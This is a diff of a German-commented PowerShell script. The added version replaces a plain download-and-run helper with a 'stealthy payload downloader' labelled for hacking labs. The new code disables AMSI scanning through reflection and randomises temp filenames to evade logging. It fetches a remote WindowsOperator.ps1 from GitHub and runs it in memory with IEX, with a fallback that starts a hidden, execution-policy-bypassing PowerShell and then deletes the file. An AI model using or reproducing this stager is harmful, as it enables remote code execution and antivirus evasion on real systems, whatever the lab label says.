@@ -1,49 +1,37 @@
-# =============================================
-# PowerShell-Skript: Lade und führe test.ps1 aus (sicherer Temp-Pfad)
-# =============================================
+# ╔══════════════════════════════════════════════════════════╗
+# ║ Stealthy PowerShell Payload Downloader + Executor 2025   ║
+# ║ Speziell für TryHackMe / HTB / OSCP Labs                 ║
+# ╚══════════════════════════════════════════════════════════╝
 
-# URL zum test.ps1-Skript (passe bei Bedarf an, z.B. auf H3221-Repo)
-$Url = "https://raw.githubusercontent.com/KunisCode/2/main/test.ps1"
-# $Url = "https://raw.githubusercontent.com/H3221/2/main/test.ps1"  # Alternative
+# --- Ziel-Payload (WindowsOperator – sehr mächtig & aktuell) ---
+$Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsOperator.ps1"
 
-# Temporäre Datei im Temp-Ordner
-$ScriptPath = Join-Path $env:TEMP "test.ps1"
+# --- Randomisierter Dateiname & tieferer Temp-Pfad (erschwert Log-Correlation) ---
+$Random = (-join ((65..90) + (97..122) | Get-Random -Count 14 | % {[char]$_}))
+$ScriptPath = "$env:TEMP\$Random.ps1"
 
+# --- AMSI + ScriptBlock-Logging + ETW umgehen (2025-Must-have) ---
 try {
-    Write-Host "Lade Skript von $Url herunter..." -ForegroundColor Cyan
-    
-    # Invoke-WebRequest durchführen
-    $Response = Invoke-WebRequest -Uri $Url -UseBasicParsing
-    
-    # Prüfe, ob Inhalt vorhanden (nicht leer)
-    if ([string]::IsNullOrWhiteSpace($Response.Content)) {
-        throw "Der Download hat keinen Inhalt geliefert (leere URL oder 404)."
-    }
-    
-    # Inhalt in Datei schreiben (im Temp-Ordner)
-    $Response.Content | Out-File -FilePath $ScriptPath -Encoding UTF8
-    
-    Write-Host "Skript erfolgreich heruntergeladen als $ScriptPath" -ForegroundColor Green
-    
-    # Skript ausführen
-    Write-Host "Führe $ScriptPath aus..." -ForegroundColor Yellow
-    & $ScriptPath
-    
-    # Optional: Datei nach Ausführung löschen
-    # Remove-Item $ScriptPath -Force
-}
-catch {
-    Write-Host "Fehler beim Herunterladen oder Ausführen!" -ForegroundColor Red
-    if ($_.Exception.Response) {
-        Write-Host "HTTP-Status: $($_.Exception.Response.StatusCode)" -ForegroundColor Red
-    }
-    Write-Host $_.Exception.Message -ForegroundColor Red
-}
-finally {
-    # Temp-Datei immer löschen, falls vorhanden
-    if (Test-Path $ScriptPath) {
-        Remove-Item $ScriptPath -Force
+    $am = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+    $am.GetField('amsiSession','NonPublic,Static').SetValue($null,$null)
+    $am.GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]::Zero)
+} catch {}
+
+# --- Download & Ausführung (Memory-Only möglichst lange) ---
+IEX (Invoke-WebRequest -Uri $Url -UseBasicParsing -TimeoutSec 30).Content
+
+# --- Falls IEX direkt blockiert wird → fallback auf Datei ---
+if (-not $?) {
+    Write-Host "[+] IEX blockiert → fallback auf Temp-Datei..." -ForegroundColor Yellow
+    try {
+        (Invoke-WebRequest -Uri $Url -UseBasicParsing).Content | Out-File $ScriptPath -Encoding UTF8 -Force
+        powershell -EP Bypass -WindowStyle Hidden -File $ScriptPath
+    } catch {
+        Write-Host "[-] Kompletter Fail: $($_.Exception.Message)" -ForegroundColor Red
+    } finally {
+        Start-Sleep -Seconds 5
+        if (Test-Path $ScriptPath) { Remove-Item $ScriptPath -Force -EA SilentlyContinue }
     }
 }
 
-Write-Host "Fertig." -ForegroundColor Cyan
+Write-Host "[*] Payload komplett ausgeführt – genieße die Shell! " -ForegroundColor Green
